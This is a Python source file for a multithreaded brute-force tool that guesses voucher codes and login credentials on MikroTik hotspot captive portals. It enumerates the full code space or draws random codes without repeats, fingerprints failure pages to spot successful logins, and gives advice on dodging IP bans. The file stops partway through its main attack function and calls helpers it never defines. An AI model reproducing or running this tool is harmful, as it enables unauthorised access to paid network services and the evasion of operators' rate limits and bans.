import os
import re
import sys
import json
import math
import time
import queue
import random
import hashlib
import threading
from copy import deepcopy
from random import choices
from collections import Counter
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MAX_TRIES_PER_CARD = 3     # extra retries for one card when the network fails (* v3.2)
NET_ERR_BURST    = 25      # consecutive connection errors before declaring target gone
NET_SILENCE_SEC  = 6.0     # full silence (no HTTP reply at all) before aborting
SLOW_DIAG_AFTER  = 8.0     # response time above this -> "slow" tag in diagnostics
READ_TIMEOUT     = 8.0     # was 4.0 -> too short for a busy router or RADIUS
CONNECT_TIMEOUT  = 3.0
MAX_SAVED_TRIED  = 1_000_000  # v3.3: cap of tried cards persisted per profile (random mode)


if os.name == 'nt':
    os.system('')
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stdin.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

red    = '\033[1;31m'
green  = '\033[2;32m'
blue   = '\033[2;36m'
white  = '\033[1;37m'
yellow = '\033[1;33m'
purple = '\033[2;35m'
cyan   = '\033[1;96m'
gray   = '\033[2;37m'

try:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
except NameError:
    SCRIPT_DIR = os.getcwd()
DB_FILE = os.path.join(SCRIPT_DIR, 'mikrotikbf_profiles.json')
HITS_FILE = os.path.join(SCRIPT_DIR, 'kirapass_hits.txt')

HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/125.0.0.0 Safari/537.36"),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

FAILURE_SIGNS = [
    'invalid username or password', 'wrong username or password',
    'login failed', 'failed to log in', 'access denied',
    'radius server is not responding', 'please log in', 'try again',
    'incorrect', 'authentication failed', 'cannot log in',
]

CHARSETS = {
    '1': '0123456789',
    '2': 'abcdefghijklmnopqrstuvwxyz',
    '3': '0123456789abcdefghijklmnopqrstuvwxyz',
}

def classify_error(exc):
    """Returns (kind, short_text)."""
    full = f'{type(exc).__name__}: {exc}'
    short = full if len(full) <= 160 else full[:157] + '...'
    txt = full.lower()

    if isinstance(exc, requests.exceptions.SSLError):
        return 'ssl', short
    if isinstance(exc, requests.exceptions.ProxyError):
        return 'proxy', short
    if isinstance(exc, requests.exceptions.ConnectTimeout):
        return 'connect_timeout', short
    if isinstance(exc, requests.exceptions.ReadTimeout):
        return 'read_timeout', short
    if isinstance(exc, requests.exceptions.Timeout):
        return 'timeout', short
    if isinstance(exc, requests.exceptions.ConnectionError):
        if ('remote end closed' in txt or 'connection aborted' in txt
                or 'remotedisconnected' in txt or 'protocolerror' in txt):
            return 'stale_keepalive', short
        if 'connection reset' in txt or 'reset by peer' in txt:
            return 'conn_reset', short
        if 'refused' in txt:
            return 'conn_refused', short
        if 'timed out' in txt:
            return 'conn_timeout', short
        if ('name resolution' in txt or 'nodename nor servname' in txt
                or 'name or service not known' in txt or 'getaddrinfo' in txt):
            return 'dns', short
        if 'no route to host' in txt or 'network is unreachable' in txt:
            return 'unreachable', short
        return 'conn_error', short
    if isinstance(exc, requests.exceptions.TooManyRedirects):
        return 'redirect_loop', short
    if isinstance(exc, requests.exceptions.RequestException):
        return 'request_error', short
    return 'other', short


ERROR_HINTS = {
    'stale_keepalive': ('server closed a reused keep-alive connection - '
                        'not a ban and not an expired card (auto-retried)'),
    'conn_reset':      ('router cut the connection (RST) - usually the max '
                        'connection limit of the MikroTik HTTP server'),
    'conn_refused':    ('port closed - hotspot http is down or a drop rule'),
    'conn_timeout':    ('no reply at all - wifi/router or a drop rule'),
    'read_timeout':    ('router answered late - overload or slow RADIUS'),
    'connect_timeout': ('cannot open a TCP connection - network down or drop'),
    'timeout':         ('generic timeout'),
    'dns':             ('name resolution failed - network down'),
    'unreachable':     ('no route to host - you left the hotspot network'),
    'ssl':             ('TLS problem - usually http vs https'),
    'proxy':           ('proxy interference'),
    'conn_error':      ('other connection error'),
    'redirect_loop':   ('redirect loop'),
    'request_error':   ('generic request error'),
    'other':           ('unexpected exception'),
}

def load_db():
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        if isinstance(data, dict) and isinstance(data.get('profiles'), list):
            return data
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        pass
    return {'profiles': []}


def save_db(db):
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(db, f, indent=2, ensure_ascii=False)
        return True
    except OSError as e:
        print(f'{red} * Cannot save database: {e}{white}')
        return False



def ask_int(prompt, default=None, minv=1, maxv=10_000_000_000):
    while True:
        raw = input(prompt).strip()
        if raw == '' and default is not None:
            return default
        try:
            v = int(raw)
            if minv <= v <= maxv:
                return v
        except ValueError:
            pass
        print(f'  {red}* Enter a number between {minv} and {maxv}.{white}')


def ask_yn(prompt, default_yes=False):
    d = 'Y/n' if default_yes else 'y/N'
    raw = input(f'{prompt} {green}[{d}]{white} : ').strip().lower()
    if raw == '':
        return default_yes
    return raw in ('y', 'yes')


def normalize_url(u):
    u = u.strip()
    if u and not u.lower().startswith(('http://', 'https://')):
        u = 'http://' + u
    return u


def same_path(a, b):
    pa, pb = urlparse(a), urlparse(b)
    return (pa.netloc.lower(), pa.path) == (pb.netloc.lower(), pb.path)


def char_set(title):
    while True:
        c = input(f'''{yellow}
 Choose characters for the {title} :{white}
  1) only numbers   (0-9)
  2) only letters   (a-z)
  3) both           (0-9 a-z)
 >>> ''').strip()
        if c in CHARSETS:
            return CHARSETS[c]
        print(f'  {red}* Invalid choice (1/2/3).{white}')


_tls = threading.local()


def thread_session():
    s = getattr(_tls, 'session', None)
    if s is None:
        s = requests.Session()
        s.headers.update(HEADERS)
        _tls.session = s
    return s


def close_thread_session():
    s = getattr(_tls, 'session', None)
    if s is not None:
        try:
            s.close()
        except Exception:
            pass
        _tls.session = None
        _tls.warmed = False


def _warm_session(s, p):
    """v3.8: browsers GET the login page first so the portal sets its cookies;
    a POST without those cookies is rejected by many captive portals.
    One warm GET per session makes it carry them (flag lives on the session
    itself so fresh sessions are always warmed - v3.9)."""
    if getattr(s, '_kp_warmed', False):
        return
    try:
        s.get(p['login_url'], timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
              verify=False, allow_redirects=True)
    except Exception:
        pass
    s._kp_warmed = True


def test_connection(url, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), tries=3):
    """
    * v3.2: retry when the router closes the connection (RemoteDisconnected).
    A single transient failed request used to show 'Cannot reach target' and
    stop everything even though the router was fine - a source of false alarms.
    """
    last = None
    for i in range(tries):
        s = requests.Session()
        s.headers.update(HEADERS)
        try:
            return s.get(url, timeout=timeout, verify=False, allow_redirects=True)
        except requests.exceptions.ConnectionError as e:
            last = e
            kind, _ = classify_error(e)
            if kind in ('stale_keepalive', 'conn_reset') and i < tries - 1:
                time.sleep(0.2 * (i + 1))
                continue
            raise
        finally:
            try:
                s.close()
            except Exception:
                pass
    if last:
        raise last
    raise requests.exceptions.ConnectionError('unreachable')

def _apply_fields(p, u, pw):
    """builds the submitted field dict: user, password (per pass_mode),
    dst/popup extras, and any user-defined fixed fields."""
    f = {p.get('user_field', 'username'): u}
    pm = p.get('pass_mode', 'same')
    if pm == 'same':
        if pw is not None:
            f[p.get('pass_field', 'password')] = pw
    elif pm == 'empty':
        f[p.get('pass_field', 'password')] = ''
    elif pm == 'fixed':
        f[p.get('pass_field', 'password')] = p.get('pass_fixed', '')
    elif pm == 'md5user':
        # v3.7: password = hexMD5(username) - the common doLogin() formula
        f[p.get('pass_field', 'password')] = hashlib.md5(
            u.encode('utf-8')).hexdigest()
    # pm == 'omit' -> no password field at all
    if p.get('extras'):
        f[p.get('dst_field', 'dst')] = p.get('dst_value', '')
        f[p.get('popup_field', 'popup')] = 'true'
    for k, v in (p.get('fixed_fields') or {}).items():
        f[k] = v
    return f


def _raw_send(s, p, u, pw, timeout):
    f = _apply_fields(p, u, pw)
    if p.get('method') == '2':
        return s.post(p['login_url'], data=f,
                      timeout=timeout, verify=False, allow_redirects=False)
    return s.get(p['login_url'], params=f,
                 timeout=timeout, verify=False, allow_redirects=False)


def send_login(p, u, pw, session=None,
               timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), retry_stale=True):
    """
    * v3.1: retry once on a 'stale connection' error.
    This alone removes most of the phantom Err counts of v3.0.
    A thread-local flag records that a retry happened (for the report).
    """
    s = session or thread_session()
    _warm_session(s, p)
    try:
        resp = _raw_send(s, p, u, pw, timeout)
        _tls.retried = False
        return resp
    except requests.exceptions.ConnectionError as e:
        kind, _ = classify_error(e)
        _tls.retried = False
        if retry_stale and kind in ('stale_keepalive', 'conn_reset'):
            close_thread_session()
            s2 = session or thread_session()
            _warm_session(s2, p)
            resp = _raw_send(s2, p, u, pw, timeout)
            _tls.retried = True
            return resp
        raise



def is_successful(p, resp, keyword):
    try:
        url = (resp.url or '').lower()
        loc = (resp.headers.get('Location') or '').lower()
        html = (resp.text or '').lower()
    except Exception:
        return False
    sig = p.get('success_signature')
    if sig:
        words = set(re.findall(r'[a-z]{3,}', html))
        hits = sum(1 for w in sig if w in words)
        if hits >= max(2, int(len(sig) * 0.4)):
            return True
    surl = p.get('success_url')
    if surl:
        a = urlparse(surl)
        if a.path not in ('', '/') and (same_path(surl, url) or a.path in loc):
            return True
    sc = (p.get('success_url_contains') or '').strip().lower()
    if sc and (sc in url or sc in loc):
        return True
    if '/status' in url or '/status' in loc:
        return True
    for f in FAILURE_SIGNS:
        if f in html:
            return False
    kw = (keyword or '').strip().lower()
    if kw and (kw in html or kw in url or kw in loc):
        return True

    return False


def extract_signature(success_text, fail_text, limit=12):
    """words present in the success page and absent from the failure page"""
    fw = set(re.findall(r'[a-z]{3,}', (fail_text or '').lower()))
    seen = []
    for w in re.findall(r'[a-z]{3,}', (success_text or '').lower()):
        if w not in fw and w not in seen:
            seen.append(w)
        if len(seen) >= limit:
            break
    return seen

def learn_success_page(p):
    print(f'''
{cyan} +-- Teach SUCCESS page -------------------------+{white}
 | {gray}Log in now with correct data you know (even test data) |{white}
 | {gray}The tool will learn the success page shape on its own  |{white}
{cyan} +------------------------------------------------+{white}''')

    u = input(' Known-good Username : ').strip()
    w = input(' Known-good Password : ').strip()
    if not u:
        print(f'{red} * Cancelled.{white}')
        return False
    if not w:
        w = u
        print(f'{gray} * Password left empty - using the username as the '
              f'password (username = password shape).{white}')

    try:
        ok_resp = send_login(p, u, w, timeout=(4, 8))
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} * Request failed [{kind}]: {short}{white}')
        print(f'{gray}   -> {ERROR_HINTS.get(kind, "")}{white}')
        return False
    bad = ''.join(choices('zqx9', k=12))
    try:
        bad_resp = send_login(p, bad, bad, timeout=(4, 8))
    except Exception:
        bad_resp = None

    sig = extract_signature(ok_resp.text,
                            bad_resp.text if bad_resp is not None else '')

    identical = (bad_resp is not None
                 and same_path(ok_resp.url or '', bad_resp.url or '')
                 and not sig)

    if identical:
        print(f'''{yellow}
 ! Success & failure pages look IDENTICAL -
   cannot learn. Falling back to /status and the keyword.{white}''')
        return False

    p['success_url'] = ok_resp.url or ''
    if sig:
        p['success_signature'] = sig
        print(f'\n {green}* Learned! Signature words:{white} '
              f'{cyan}{", ".join(sig[:8])}{white}')
    else:
        print(f'\n {yellow}! Saved success URL only (no signature words).{white}')
    print(f' {gray}Success URL: {p["success_url"]}{white}')
    return True

def ask_url_and_test(p):
    while True:
        raw = input(f'{white} -> Login URL {green}(ex: http://10.5.50.1/login){white} : ')
        url = normalize_url(raw)
        if not url:
            continue
        print(f'{yellow} > Testing connection...{white}')
        t0 = time.time()
        try:
            r = test_connection(url)
            dt = (time.time() - t0) * 1000
            print(f'{green} * Connected! (HTTP {r.status_code}, {dt:.0f} ms)'
                  f'{white}\n')
            p['login_url'] = url
            return True
        except Exception as e:
            kind, short = classify_error(e)
            print(f'{red} * Connection failed [{kind}]: {short}{white}')
            print(f'{gray}   -> {ERROR_HINTS.get(kind, "")}{white}')
            if not ask_yn(' Retry with another URL?', default_yes=True):
                return False


def ask_method_and_fields(p):
    print(f'''{yellow}
 +---------------------------------------------+
 |  1) GET  -> data appears in the URL         |
 |  2) POST -> data hidden in the body (newer) |
 |                                             |
 |  {gray}? Not sure? open the login page, press F12{yellow} |
 |    {gray}and look for <form method="..."{yellow}           |
 +---------------------------------------------+{white}''')
    c = input(f'{white} -> Method {green}(1/2, Enter=1){white} : ').strip()
    p['method'] = '2' if c == '2' else '1'

    if p['method'] == '2':
        p['user_field'] = input(f' -> Username field {green}(Enter=username){white} : ').strip() or 'username'
        p['pass_field'] = input(f' -> Password field {green}(Enter=password){white} : ').strip() or 'password'
        p['extras'] = ask_yn(' -> Send Mikrotik hidden fields (dst/popup)?', default_yes=True)
        if p['extras']:
            p['dst_field']   = input(f' -> dst field   {green}(Enter=dst){white}   : ').strip() or 'dst'
            p['dst_value']   = input(f' -> dst value   {green}(Enter = empty, or the URL shown in the login page address bar, e.g. http://www.msftconnecttest.com/redirect){white} : ').strip()
            p['popup_field'] = input(f' -> popup field {green}(Enter=popup){white} : ').strip() or 'popup'
    else:
        p['extras'] = ask_yn(' -> Also send dst/popup in the GET query?', default_yes=True)
        if p['extras']:
            p['dst_value'] = input(f' -> dst value   {green}(Enter = empty){white} : ').strip()

    print(f'''{yellow}
 Password value to send:
  1) same as card/user (default)
  2) empty string      (some portals force it to "")
  3) omit the field entirely
  4) a fixed value
  5) hexMD5(username)  (portals whose doLogin() hashes the username){white}''')
    c = input(f'{white} -> Password value {green}(1/2/3/4/5, Enter=1){white} : ').strip()
    if c == '2':
        p['pass_mode'] = 'empty'
    elif c == '3':
        p['pass_mode'] = 'omit'
    elif c == '4':
        p['pass_mode'] = 'fixed'
        p['pass_fixed'] = input(f' -> Fixed password value : ').strip()
    elif c == '5':
        p['pass_mode'] = 'md5user'
    else:
        p['pass_mode'] = 'same'

    raw = input(f' -> Extra fixed fields {green}(name=value, comma separated, Enter=none){white} : ').strip()
    if raw:
        ff = {}
        for part in raw.split(','):
            if '=' in part:
                k, v = part.split('=', 1)
                ff[k.strip()] = v.strip()
        if ff:
            p['fixed_fields'] = ff


def ask_network_shape(p):
    print(f'''{yellow}
 +---------------------------------------------+
 |  1) username only (card/code)               |
 |  2) username = password                     |
 |  3) username + password (different)         |
 +---------------------------------------------+{white}''')
    while True:
        nt = input(f'{white} -> Type {green}(1/2/3){white} : ').strip()
        if nt in ('1', '2', '3'):
            break
        print(f'{red} * Invalid.{white}')
    p['network_type'] = nt

    if nt in ('1', '2'):
        while True:
            cs = char_set('card/code')
            total_len = ask_int(' -> Full card length : ', minv=1, maxv=64)
            pre = input(f' -> Prefix   {green}(Enter if none){white} : ').strip()
            suf = input(f' -> Suffix   {green}(Enter if none){white} : ').strip()
            var = total_len - len(pre) - len(suf)
            if var > 0:
                p.update(charset=cs, var_len=var, prefix=pre, suffix=suf)
                return
            print(f'{red} * Prefix+Suffix longer than the full length!{white}')
    else:
        for tag, key in (('username', 'u'), ('password', 'p')):
            while True:
                cs = char_set(tag)
                total_len = ask_int(f' -> Full {tag} length : ', minv=1, maxv=64)
                pre = input(f' -> {tag} prefix {green}(Enter if none){white} : ').strip()
                suf = input(f' -> {tag} suffix {green}(Enter if none){white} : ').strip()
                var = total_len - len(pre) - len(suf)
                if var > 0:
                    p.update({f'{key}_charset': cs, f'{key}_len': var,
                              f'{key}_prefix': pre, f'{key}_suffix': suf})
                    break
                print(f'{red} * Prefix+Suffix longer than the full length!{white}')


def ask_guess_mode(p):
    print(f'''{yellow}
 +---------------------------------------------+
 |  Guess mode:                                |
 |  1) Systematic - walk every combo exactly   |
 |     once, resumable across runs             |
 |  2) Pure random - a fresh random draw every |
 |     time, NEVER repeats a tried card.       |
 |     Best for huge spaces (10+ digit cards). |
 +---------------------------------------------+{white}''')
    c = input(f'{white} -> Guess mode {green}(1/2, Enter=1){white} : ').strip()
    p['guess_mode'] = '2' if c == '2' else '1'


def print_profile_summary(p):
    method = 'POST' if p.get('method') == '2' else 'GET'
    learned = 'Yes *' if (p.get('success_signature') or p.get('success_url')) else 'No'
    mode = 'RANDOM' if p.get('guess_mode') == '2' else 'SYSTEMATIC'
    tried_n = len(p.get('tried_cards') or [])
    nt = p['network_type']
    if nt in ('1', '2'):
        full = p['var_len'] + len(p['prefix']) + len(p['suffix'])
        shape = f'card len={full}  [{p["prefix"]}...{p["suffix"]}]'
    else:
        uf = p['u_len'] + len(p['u_prefix']) + len(p['u_suffix'])
        pf = p['p_len'] + len(p['p_prefix']) + len(p['p_suffix'])
        shape = f'user len={uf} | pass len={pf}'
    tried_line = ''
    if p.get('guess_mode') == '2':
        tried_line = f'\n | {cyan}Tried   :{white} {fmt_int(tried_n)} cards excluded so far'
    pm = p.get('pass_mode', 'same')
    shape_line = f'\n | {cyan}PassVal :{white} {pm}' + (f'="{p.get("pass_fixed", "")}"' if pm == 'fixed' else '')
    ff = p.get('fixed_fields') or {}
    ff_line = f'\n | {cyan}Fixed   :{white} ' + (', '.join(f'{k}={v}' for k, v in ff.items()) if ff else 'none')
    sc = p.get('success_url_contains')
    sc_line = f'\n | {cyan}SuccIn  :{white} {sc}' if sc else ''
    print(f'''
 {white}.------------------------------------------.
 | {cyan}URL     :{white} {p["login_url"]}
 | {cyan}Method  :{white} {method}
 | {cyan}Type    :{white} {nt}  ({shape})
 | {cyan}Mode    :{white} {mode}{tried_line}{shape_line}{ff_line}{sc_line}
 | {cyan}Learned :{white} {learned}
 '------------------------------------------' ''')

def top_error(kinds):
    if not kinds:
        return ''
    k, n = kinds.most_common(1)[0]
    return f'{k}x{n}'

def _space_size(charset, n):
    """number of all possible combos = |chars| ^ length"""
    return max(1, len(charset) ** int(n))


def _decode_index(idx, charset, n):
    """turn an index into text: bijection between [0, space) and all texts."""
    base = len(charset)
    out = []
    for _ in range(int(n)):
        out.append(charset[idx % base])
        idx //= base
    return ''.join(out)


def _profile_space(p):
    """size of the probability space of the profile (all possible cards/pairs)."""
    if p.get('network_type') in ('1', '2'):
        return _space_size(p['charset'], p['var_len'])
    return (_space_size(p['u_charset'], p['u_len'])
            * _space_size(p['p_charset'], p['p_len']))


def _new_walk(space):
    """
    full cyclic walk: index(i) = (b + a*i) mod space
    with gcd(a, space) = 1 -> visits every index exactly once before returning
    to the start, in a scrambled order. Memory O(1).
    """
    rnd = random.Random()
    a = 1
    if space > 2:
        while True:
            a = rnd.randrange(1, space)
            if math.gcd(a, space) == 1:
                break
    b = rnd.randrange(0, space) if space > 1 else 0
    return {'a': a, 'b': b, 'space': space, 'pos': 0, 'passes': 0}


def get_walk(p):
    """returns (walk, space, note) and stores state inside the profile."""
    space = _profile_space(p)
    w = p.get('walk')
    note = ''
    if (not isinstance(w, dict) or w.get('space') != space
            or not w.get('a') or not (0 <= int(w.get('pos', 0)) <= space)):
        w = _new_walk(space)
        note = 'new coverage pass'
    elif int(w.get('pos', 0)) >= space:
        passes = int(w.get('passes', 0)) + 1
        w = _new_walk(space)
        w['passes'] = passes
        note = f'full pass #{passes} completed - pass #{passes + 1} started'
    p['walk'] = w
    return w, space, note


def card_gen(p, walk, start_pos):
    """generates cards with zero repeats inside a pass (unlike old choices)."""
    nt = p.get('network_type')
    a, b, space = walk['a'], walk['b'], walk['space']
    if nt in ('1', '2'):
        cs, ln = p['charset'], p['var_len']
        pre, suf = p['prefix'], p['suffix']
        i = start_pos
        while True:
            idx = (b + a * i) % space
            card = pre + _decode_index(idx, cs, ln) + suf
            yield (card, card if nt == '2' else None)
            i += 1
    else:
        ucs, ulen = p['u_charset'], p['u_len']
        pcs, plen = p['p_charset'], p['p_len']
        upre, usuf = p['u_prefix'], p['u_suffix']
        ppre, psuf = p['p_prefix'], p['p_suffix']
        p_space = _space_size(pcs, plen)
        i = start_pos
        while True:
            idx = (b + a * i) % space
            uidx, pidx = divmod(idx, p_space)
            u = upre + _decode_index(uidx, ucs, ulen) + usuf
            w = ppre + _decode_index(pidx, pcs, plen) + psuf
            yield (u, w)
            i += 1


def _load_tried(p):
    """v3.3: load the persisted tried-card set (random mode)."""
    t = p.get('tried_cards')
    if isinstance(t, list):
        return set(t)
    return set()


def random_gen(p, tried):
    """
    v3.3: pure random draws that NEVER repeat a card already in `tried`.
    Each draw is independent (true random), the set only blocks repeats.
    `tried` holds the variable part (or user\\0pass key) of tried cards.
    """
    nt = p.get('network_type')
    if nt in ('1', '2'):
        cs, ln = p['charset'], int(p['var_len'])
        pre, suf = p['prefix'], p['suffix']
        while True:
            var = ''.join(choices(cs, k=ln))
            if var in tried:
                continue
            tried.add(var)
            card = pre + var + suf
            yield (card, card if nt == '2' else None)
    else:
        ucs, ulen = p['u_charset'], int(p['u_len'])
        pcs, plen = p['p_charset'], int(p['p_len'])
        upre, usuf = p['u_prefix'], p['u_suffix']
        ppre, psuf = p['p_prefix'], p['p_suffix']
        while True:
            uvar = ''.join(choices(ucs, k=ulen))
            pvar = ''.join(choices(pcs, k=plen))
            key = uvar + '\x00' + pvar
            if key in tried:
                continue
            tried.add(key)
            yield (upre + uvar + usuf, ppre + pvar + psuf)


def fmt_int(n):
    return f'{n:,}'

def space_line(p, walk=None, space=None, sent=None):
    if space is None:
        space = _profile_space(p)
    if p.get('guess_mode') == '2':
        done = len(p.get('tried_cards') or [])
        txt = (f'Space: {fmt_int(space)} combos  |  '
               f'random mode, excluded so far: {fmt_int(done)} '
               f'({done / space * 100:.3f}%)')
        if sent is not None:
            txt += f'  |  this run: {fmt_int(sent)} distinct'
        return txt
    if walk is None:
        walk = p.get('walk') or {}
    done = int(walk.get('pos', 0))
    done = min(done, space)
    txt = (f'Space: {fmt_int(space)} combos  |  '
           f'covered so far: {fmt_int(done)} ({done / space * 100:.1f}%)')
    if sent is not None:
        txt += f'  |  this run: {fmt_int(sent)} distinct'
    return txt

def attack(p, count, threads_count, keyword):
    lock = threading.Lock()
    stop_event = threading.Event()
    now = time.time()
    mode = p.get('guess_mode', '1')
    space = _profile_space(p)

    if mode == '2':
        # v3.3 pure random, no repeats of tried cards
        tried = _load_tried(p)
        start_pos = len(tried)
        remaining = max(space - start_pos, 0)
        effective = count if remaining <= 0 else min(count, remaining)
        capped = effective < count
        walk = None
        walk_note = f'random mode - {fmt_int(start_pos)} cards already excluded'

        def gen():
            return random_gen(p, tried)
    else:
        walk, space, walk_note = get_walk(p)
        start_pos = int(walk.get('pos', 0))
        remaining = max(space - start_pos, 0)
        effective = count if remaining <= 0 else min(count, remaining)
        capped = effective < count
        tried = None

        def gen():
            return card_gen(p, walk, start_pos)

    shared = {
        'tested': 0, 'errors': 0, 'found': False,
        'user': None, 'pw': None, 'elapsed': 0,
        'space': space, 'start_pos': start_pos, 'sent': 0,
        'effective': effective, 'capped': capped, 'walk_note': walk_note,
        'mode': mode,
        'tried': tried, 'tried_start': start_pos if mode == '2' else 0,
        'last_card': '', 'last_status': None,
        'error_kinds': Counter(),
        'http_status': Counter(),
        'retried': 0,
        'requeued': 0,
        'failed_cards': 0,
        'responses': 0,
        'last_resp_ts': now,
        'err_since_resp': 0,
        'unreachable': False,
        'unreachable_kind': '',
        'unreachable_reason': '',
        'block_warn': False,
        'latencies': [],
    }

    total = effective
    width = len(str(total))

    # v3.5 fingerprints: the plain login page and one deliberate wrong-card
    # reply, so every attempt can be judged against the failure baseline.
    base_d = None
    try:
        b = test_connection(p['login_url'], tries=1)
        base_d = {'status': b.status_code, 'len': len(b.text or '')}
    except Exception:
        base_d = None
    wrong_d = None
    wrong_sha = None
    try:
        # v3.11: TWO wrong-card probes. If both replies are byte-identical the
        # failure page is static and we can compare attempts by exact content
        # (sha256) instead of the old +/-40 length tolerance - which swallowed
        # success pages that were only a few bytes off the failure page.
        wz = ''.join(choices('zqx9', k=8))
        w = send_login(p, wz, wz, retry_stale=False)
        wz2 = ''.join(choices('zqx9', k=8))
        w2 = send_login(p, wz2, wz2, retry_stale=False)
        wrong_d = {'status': w.status_code, 'len': len(w.text or ''),
                   'blocked': _looks_blocked(w.text or '')}
        n1 = _normalize_page(w.text or '', (wz, wz))
        n2 = _normalize_page(w2.text or '', (wz2, wz2))
        if n1 == n2:
            wrong_sha = hashlib.sha256(
                n1.encode('utf-8', 'replace')).hexdigest()
        else:
            print(f' {yellow}! failure page is dynamic even after masking '
                  f'timestamps/uuids - falling back to length tolerance'
                  f'{white}')
    except Exception:
        wrong_d = None
    print(f' {gray}baseline login page: {base_d} | wrong-card reply: '
          f'{wrong_d}{" (exact-match mode)" if wrong_sha else ""}{white}')
    try:
        if wrong_d and _looks_blocked(w.text):
            print(f' {red}* WARNING: the portal served its BLOCKED page to a '
                  f'plain wrong card - your IP may already be banned '
                  f'(restart the router to get a new IP).{white}')
    except Exception:
        pass

    def note_response(status):
        """an HTTP reply arrived -> network alive, reset the silence counter."""
        with lock:
            shared['responses'] += 1
            shared['last_resp_ts'] = time.time()
            shared['err_since_resp'] = 0
            shared['http_status'][status] += 1
            if status in (403, 429) or 500 <= status < 600:
                hot = shared['http_status'][403] + shared['http_status'][429]
                hot += sum(v for k, v in shared['http_status'].items()
                           if 500 <= k < 600)
                if hot >= 5 and not shared['block_warn']:
                    shared['block_warn'] = True
                    print(f'\n {yellow}! HTTP {status} seen {hot} times - '
                          f'possible blocking / rate-limit on the router.{white}\n')

    def note_error(kind):
        with lock:
            shared['error_kinds'][kind] += 1
            shared['err_since_resp'] += 1
            silent = time.time() - shared['last_resp_ts']
            never_answered = (shared['responses'] == 0
                              and shared['err_since_resp'] >= NET_ERR_BURST)
            went_silent = (shared['err_since_resp'] >= NET_ERR_BURST
                           and silent >= NET_SILENCE_SEC)
            if never_answered or went_silent:
                shared['unreachable'] = True
                shared['unreachable_kind'] = kind
                shared['unreachable_reason'] = ('never answered' if never_answered
                                                else f'silent for {silent:.0f}s')
                print(f'\n {red}* TARGET UNREACHABLE - stopping...{white}\n')
                stop_event.set()

    def do_attempt(u, pw):
        """
        * v3.2: a card whose request failed at network level was never really
        tried, so it is retried inside the same thread (internal retry) so the
        "coverage" is real. The bounded queue used to drop retries when full.
        """
        resp = None
        t0 = time.time()
        for tries in range(MAX_TRIES_PER_CARD + 1):
            try:
                resp = send_login(p, u, pw)
                break
            except Exception as e:
                resp = None
                kind, _ = classify_error(e)
                note_error(kind)
                with lock:
                    shared['errors'] += 1
                    shared['tested'] += 1
                    if tries > 0:
                        shared['requeued'] += 1
                if tries >= MAX_TRIES_PER_CARD or stop_event.is_set():
                    with lock:
                        if not stop_event.is_set():
                            shared['failed_cards'] += 1
                    return
                time.sleep(0.05 * (tries + 1))
        if resp is None:
            return
        dt = time.time() - t0
        st = getattr(resp, 'status_code', 0)
        loc = resp.headers.get('Location') or ''
        ln = len(resp.text or '')

        ok = False
        if not stop_event.is_set():
            ok = is_successful(p, resp, keyword)
        if ok:
            verdict = f'SUCCESS -> {loc[:48]}' if loc else 'SUCCESS'
        elif 300 <= st < 400 and loc:
            verdict = f'REDIRECT -> {loc[:48]}'
        elif _looks_blocked(resp.text or '') and not (
                wrong_d and wrong_d.get('blocked')):
            verdict = 'BLOCKED page - your IP got banned mid-run'
        elif wrong_d and st == wrong_d['status'] and (
                (hashlib.sha256(_normalize_page(resp.text or '', (u, pw))
                                .encode('utf-8', 'replace')).hexdigest()
                 == wrong_sha) if wrong_sha is not None
                else abs(ln - wrong_d['len']) <= 40):
            verdict = 'same as failure'
        elif (base_d and st == base_d['status'] and not loc
              and abs(ln - base_d['len']) <= 40):
            verdict = 'login page again'
        else:
            verdict = f'DIFFERENT page len={ln}'

        with lock:
            shared['latencies'].append(round(dt * 1000))
            if getattr(_tls, 'retried', False):
                shared['retried'] += 1
            shared['tested'] += 1
            n = shared['tested']
            shared['last_card'] = u
            shared['last_status'] = st
        note_response(st)
        col = green if ok else (yellow if verdict.startswith(
            ('REDIRECT', 'DIFFERENT')) else white)
        strong = ok or verdict.startswith('DIFFERENT')
        with lock:
            print(f' {gray}#{n:0{width}d}/{total}{white} '
                  f'{n / total * 100:5.1f}%  card: {cyan}{u}{white}  | '
                  f'HTTP {st} | {col}{verdict}{white}')
            if strong and not shared['found']:
                shared['found'] = True
                shared['user'], shared['pw'] = u, pw
                shared['suspected'] = not ok

        if ok or verdict.startswith(('REDIRECT', 'DIFFERENT')):
            try:
                with open(HITS_FILE, 'a', encoding='utf-8') as f:
                    f.write(f'{datetime.now():%Y-%m-%d %H:%M:%S} #{n} '
                            f'card={u} status={st} loc={loc} len={ln} '
                            f'verdict={verdict}\n')
            except OSError:
                pass
        if strong:
            if ok:
                print(f'\n {green}* MATCH FOUND - finishing...{white}\n')
            else:
                print(f'\n {green}* SUSPECTED MATCH - this card got a page '
                      f'different from every wrong card - finishing...'
                      f'{white}\n')
            stop_event.set()

    def worker():
        while True:
            try:
                u, pw = task_q.get(timeout=0.25)
            except queue.Empty:
                if stop_event.is_set():
                    return
                continue
            try:
                if not stop_event.is_set():
                    do_attempt(u, pw)
            finally:
                task_q.task_done()

    method_txt = 'POST' if p.get('method') == '2' else 'GET'
    print(f'''{gray}
 ---------------------------------------------
 {white}Target: {p["login_url"]}  {gray}|{white} {method_txt}  {gray}|{white} {mode.upper()}
 {white}Threads: {threads_count}  {gray}|{white} Attempts: {count}
 {white}{space_line(p, walk, space, None)}{white}
 ---------------------------------------------{white}''')
    if walk_note:
        print(f' {cyan}> {walk_note}{white}')
